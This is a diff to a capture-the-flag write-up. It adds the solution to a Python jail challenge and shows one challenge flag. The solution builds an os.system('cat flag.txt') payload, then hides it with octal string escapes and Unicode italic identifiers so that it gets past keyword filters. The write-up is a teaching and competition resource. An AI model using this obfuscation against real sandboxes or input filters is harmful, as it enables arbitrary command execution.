@@ -58,8 +58,17 @@ def run():
 <code>uiuctf{omae_ha_mou_shindeiru_b9e5f9}</code>
 
 ## Baby_python(_fixed)
-italics and bold
 
-Ref:
+First of all we need to find a way to import os and run cat on a single line:
+
+<code>__import__('os').system('cat flag.txt')</code>
+
+After that we can convert the strings to int and then octal
+
+<code>__𝘪𝘮𝘱𝘰𝘳𝘵__('\157\163').𝘴𝘺𝘴𝘵𝘦𝘮('\143\141\164\40\146\154\141\147\56\164\170\164')</code>
+
+And last we just have to convert the whole thing to italics, since Python (for some reason) runs it the same way as a normal string. (I used this https://yaytext.com/bold-italic/)
+
+Found the idea here:
 http://jgeralnik.github.io/
 https://irissec.xyz/articles/categories/other/2021-08-09/uiuctf-jails
